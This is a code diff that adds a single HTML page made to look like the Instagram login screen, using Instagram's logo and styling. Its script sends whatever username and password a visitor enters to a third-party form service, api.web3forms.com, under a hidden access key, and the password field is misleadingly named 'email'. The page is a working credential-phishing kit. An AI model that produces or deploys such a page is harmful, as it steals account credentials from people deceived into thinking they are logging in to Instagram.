@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Style Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 350px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .form-input {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .form-input input,
+        .form-input textarea {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+        }
+
+        .form-input input:focus,
+        .form-input textarea:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .form-button {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            color: white;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .form-button:hover {
+            background-color: #007ac1;
+        }
+
+        .form-footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .form-footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        #result {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #ff4d4d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo">
+        <form method="POST" id="form">
+            <div class="form-input">
+                <input type="hidden" name="access_key" value="ed56c54d-eb19-49ae-b051-fbe97b2d8a7f">
+                <input type="text" name="name" placeholder="Username or email" required>
+            </div>
+            <div class="form-input">
+                <input type="password" name="email" placeholder="password" required>
+            </div>
+           
+            <button type="submit" class="form-button">Login</button>
+            <div id="result"></div>
+        </form>
+        <div class="form-footer">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('form');
+        const result = document.getElementById('result');
+
+        form.addEventListener('submit', function (e) {
+            const formData = new FormData(form);
+            e.preventDefault();
+
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+
+            result.innerHTML = "Please wait...";
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+                .then(async (response) => {
+                    let json = await response.json();
+                    if (response.status === 200) {
+                        result.innerHTML = json.message;
+                        result.style.color = "green";
+                    } else {
+                        console.log(response);
+                        result.innerHTML = json.message;
+                    }
+                })
+                .catch(error => {
+                    console.log(error);
+                    result.innerHTML = "Something went wrong!";
+                })
+                .then(function () {
+                    form.reset();
+                    setTimeout(() => {
+                        result.style.display = "none";
+                    }, 3000);
+                });
+        });
+    </script>
+</body>
+</html>
